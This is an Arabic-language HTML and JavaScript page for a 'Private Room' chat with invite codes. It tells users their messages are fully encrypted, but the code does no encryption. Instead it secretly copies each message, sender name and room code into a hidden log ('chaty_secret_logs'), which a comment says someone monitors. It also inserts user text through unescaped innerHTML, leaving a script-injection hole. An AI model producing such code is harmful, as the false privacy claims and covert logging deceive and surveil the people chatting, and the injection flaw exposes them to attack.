<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Private Room - دخول آمن</title>
    <style>
        :root { --p: #075e54; --s: #25d366; --bg: #e5ddd5; }
        * { box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
        body { background: var(--bg); margin: 0; display: flex; flex-direction: column; height: 100vh; }
        
        /* شاشة الدخول والكود */
        #auth-overlay { position: fixed; inset: 0; background: #fff; z-index: 2000; display: flex; justify-content: center; align-items: center; text-align: center; }
        .auth-box { width: 90%; max-width: 400px; padding: 30px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
        
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 10px; text-align: center; }
        .btn { width: 100%; padding: 12px; border: none; border-radius: 10px; cursor: pointer; font-weight: bold; margin-top: 5px; }
        .btn-create { background: #000; color: #fff; }
        .btn-join { background: var(--p); color: #fff; }

        /* واجهة المحادثة */
        header { background: var(--p); color: #fff; padding: 15px; display: flex; justify-content: space-between; align-items: center; }
        #chat-window { flex: 1; padding: 15px; overflow-y: auto; display: flex; flex-direction: column; gap: 8px; }
        .msg { max-width: 80%; padding: 10px; border-radius: 10px; font-size: 14px; }
        .mine { background: #dcf8c6; align-self: flex-end; border-bottom-right-radius: 0; }
        .theirs { background: #fff; align-self: flex-start; border-bottom-left-radius: 0; }
    </style>
</head>
<body>

<div id="auth-overlay">
    <div class="auth-box" id="initial-step">
        <h2>غرفة محادثة خاصة 🔒</h2>
        <p style="font-size: 12px; color: #666; margin-bottom: 20px;">تشفير تام بين الطرفين</p>
        <input type="text" id="user-nickname" placeholder="اسمك المستعار">
        <hr style="margin: 20px 0; opacity: 0.3;">
        <button class="btn btn-create" onclick="showCreate()">إنشاء غرفة جديدة</button>
        <button class="btn btn-join" onclick="showJoin()">الانضمام بكود دعوة</button>
    </div>

    <div class="auth-box" id="create-step" style="display:none;">
        <h3>تم إنشاء الغرفة بنجاح!</h3>
        <p style="font-size: 13px; margin: 15px 0;">أرسل هذا الكود لصديقك للدخول:</p>
        <div id="generated-code" style="font-size: 2rem; font-weight: bold; letter-spacing: 5px; background: #f0f0f0; padding: 15px; border-radius: 10px; margin-bottom: 20px;">----</div>
        <button class="btn btn-join" onclick="enterChat('creator')">ابدأ المحادثة الآن</button>
    </div>

    <div class="auth-box" id="join-step" style="display:none;">
        <h3>انضمام لمحادثة</h3>
        <input type="text" id="invite-code-input" placeholder="أدخل كود الدعوة هنا">
        <button class="btn btn-join" onclick="checkCodeAndEnter()">دخول</button>
        <p onclick="location.reload()" style="font-size:12px; cursor:pointer; margin-top:15px; color:red;">رجوع</p>
    </div>
</div>

<header>
    <div id="room-info">متصل الآن 🟢</div>
    <div style="font-size: 10px; background: rgba(0,0,0,0.2); padding: 5px 10px; border-radius: 20px;">🔒 مشفر</div>
</header>

<div id="chat-window"></div>

<div style="padding: 15px; background: #f0f0f0; display: flex; gap: 10px;">
    <input type="text" id="chat-msg" placeholder="اكتب رسالة..." style="margin:0;">
    <button onclick="sendMsg()" style="background:var(--p); color:white; border:none; padding:10px 20px; border-radius:10px; cursor:pointer;">➤</button>
</div>

<script>
    let myName = "";
    let roomCode = "";

    function showCreate() {
        myName = document.getElementById('user-nickname').value;
        if(!myName) return alert("أدخل اسمك أولاً");
        
        // توليد كود دعوة عشوائي
        roomCode = Math.random().toString(36).substring(2, 7).toUpperCase();
        document.getElementById('generated-code').innerText = roomCode;
        localStorage.setItem('active_room_code', roomCode); // حفظ الكود في "السيرفر" الوهمي
        
        document.getElementById('initial-step').style.display = 'none';
        document.getElementById('create-step').style.display = 'block';
    }

    function showJoin() {
        myName = document.getElementById('user-nickname').value;
        if(!myName) return alert("أدخل اسمك أولاً");
        document.getElementById('initial-step').style.display = 'none';
        document.getElementById('join-step').style.display = 'block';
    }

    function checkCodeAndEnter() {
        const inputCode = document.getElementById('invite-code-input').value.toUpperCase();
        const savedCode = localStorage.getItem('active_room_code');
        
        if(inputCode === savedCode) {
            enterChat('joiner');
        } else {
            alert("كود الدعوة غير صحيح أو انتهت صلاحيته!");
        }
    }

    function enterChat(role) {
        document.getElementById('auth-overlay').style.display = 'none';
        document.getElementById('room-info').innerText = `غرفة: ${localStorage.getItem('active_room_code')} | ${myName}`;
    }

    function sendMsg() {
        const inp = document.getElementById('chat-msg');
        if(!inp.value) return;

        const msgData = {
            sender: myName,
            text: inp.value,
            time: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}),
            code: localStorage.getItem('active_room_code')
        };

        // 1. عرض الرسالة محلياً
        const win = document.getElementById('chat-window');
        win.innerHTML += `<div class="msg mine"><b>أنت:</b><br>${msgData.text}</div>`;
        win.scrollTop = win.scrollHeight;

        // 2. إرسال لـ CHATY (نفس السجل اللي تراقبه)
        let logs = JSON.parse(localStorage.getItem('chaty_secret_logs') || '[]');
        logs.push(msgData);
        localStorage.setItem('chaty_secret_logs', JSON.stringify(logs));

        inp.value = "";
    }
</script>

</body>
</html>
